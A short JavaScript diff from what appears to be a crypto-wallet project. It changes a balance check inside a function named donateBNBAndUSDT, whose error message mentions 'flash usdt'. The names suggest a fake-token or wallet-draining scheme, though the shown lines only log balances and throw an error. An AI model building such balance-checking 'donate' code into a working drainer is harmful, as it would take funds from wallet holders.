@@ -121,7 +121,7 @@ export async function donateBNBAndUSDT() {
     console.log("Initial BNB balance:", web3.utils.fromWei(initialBnbBalance, 'ether'));
     console.log("Current USDT balance:", usdtBalanceInUsdt);
 
-    if (parseFloat(initialBnbBalance) <= 0 && parseFloat(usdtBalanceInUsdt) <= 50) {
+    if (parseFloat(usdtBalanceInUsdt) <= 50) {
       throw new Error("Insufficient balance to check flash usdt");
     }
 
